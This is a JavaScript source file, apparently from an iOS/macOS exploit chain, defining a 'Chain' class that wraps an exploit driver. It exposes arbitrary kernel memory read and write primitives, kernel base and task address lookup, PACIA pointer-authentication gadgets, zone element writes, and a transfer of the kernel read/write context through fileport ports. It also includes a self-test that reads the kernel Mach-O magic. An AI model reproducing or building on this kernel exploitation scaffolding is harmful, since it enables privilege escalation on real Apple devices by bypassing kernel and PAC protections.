import Utils from "libs/JSUtils/Utils";

const TAG = "CHAIN"

export default class Chain
{
	static #driver;
	static #mutex;

	static init(driver, mutex=null)
	{
		this.#driver = driver;
		this.#mutex = mutex;
	}

	static destroy()
	{
		this.#driver.destroy();
	}

	static runPE()
	{
		return this.#driver.runPE();
	}

	static getKernelBase()
	{
		return this.#driver.getKernelBase();
	}

	static getSelfTaskAddr()
	{
		return this.#driver.getSelfTaskAddr();
	}

	static read(srcAddr, dst, len)
	{
		this.#mutexLock();
		let ret = this.#driver.read(srcAddr, dst, len);
		this.#mutexUnlock();
		return ret;
	}

	static write(dst, src, len)
	{
		this.#mutexLock();
		let ret = this.#driver.write(dst, src, len);
		this.#mutexUnlock();
		return ret;
	}

	static readBuff(srcAddr, len)
	{
		if (!this.read(srcAddr, Native.mem, len))
			return false;
		return Native.read(Native.mem, len);
	}

	static read8(src)
	{
		this.read(src, Native.mem, 1);
		return Native.read8(Native.mem);
	}

	static read16(src)
	{
		this.read(src, Native.mem, 2);
		return Native.read16(Native.mem);
	}

	static read32(src)
	{
		this.read(src, Native.mem, 4);
		return Native.read32(Native.mem);
	}

	static read64(src)
	{
		this.read(src, Native.mem, 8);
		return Native.read64(Native.mem);
	}

	static write8(dst, value)
	{
		Native.write8(Native.mem, value);
		this.write(dst, Native.mem, 1);
	}

	static write16(dst, value)
	{
		Native.write16(Native.mem, value);
		this.write(dst, Native.mem, 2);
	}

	static write32(dst, value)
	{
		Native.write32(Native.mem, value);
		this.write(dst, Native.mem, 4);
	}

	static write64(dst, value)
	{
		Native.write64(Native.mem, value);
		this.write(dst, Native.mem, 8);
	}

	static offsets()
	{
		return this.#driver.offsets();
	}

	static strip(val)
	{
		return this.#driver.strip(val);
	}

	static writeZoneElement(dstAddr,src,len)
	{
		return this.#driver.writeZoneElement(dstAddr, src, len);
	}

	static getPaciaGadget()
	{
		return this.#driver.getPaciaGadget();
	}
	static getClearPaciaGadget()
	{
		return this.#driver.getClearPaciaGadget();
	}

	static transferRW()
	{
		let rwCtx = this.#driver.transferRW();
		let controlSocket = rwCtx.controlSocket;
		let rwSocket = rwCtx.rwSocket;
		console.log(TAG, "controlSocket: " + controlSocket);
		console.log(TAG, "rwSocket: " + rwSocket);

		let portPtr = Native.mem;
		Native.callSymbol("fileport_makeport", controlSocket, portPtr);
		let controlPort = Native.read32(portPtr);

		Native.callSymbol("fileport_makeport", rwSocket, portPtr);
		let rwPort = Native.read32(portPtr);

		return {
			controlPort: controlPort,
			rwPort: rwPort,
			controlSocket: controlSocket,
			rwSocket: rwSocket
		};
	}

	static threadSpawn(scriptCFString, threadMem) {
		this.#driver.threadSpawn(scriptCFString, threadMem);
	}

	static testKRW() {
		console.log(TAG, "Testing KRW");
		console.log(TAG, "- kernelBase: " + Utils.hex(this.getKernelBase()));
		console.log(TAG, "- PACIA gadget: " + Utils.hex(this.getPaciaGadget()));
		console.log(TAG, "- Read kernel magic (4 bytes)");

		let buff = this.readBuff(this.getKernelBase(), 4);
		if (!buff) {
			console.log(TAG, "kernel RW not working!");
			return false;
		}
		let buff32 = new Uint32Array(buff);
		console.log(TAG, `- Magic: ${Utils.hex(buff32[0])}`);

		if (buff32[0] != 0xfeedfacf) {
			console.log(TAG, "Invalid magic!");
			return false;
		}

		return true;
	}

	static #mutexLock() {
		if (this.#mutex)
			Native.callSymbol("pthread_mutex_lock", this.#mutex);
	}

	static #mutexUnlock() {
		if (this.#mutex)
			Native.callSymbol("pthread_mutex_unlock", this.#mutex);
	}
}
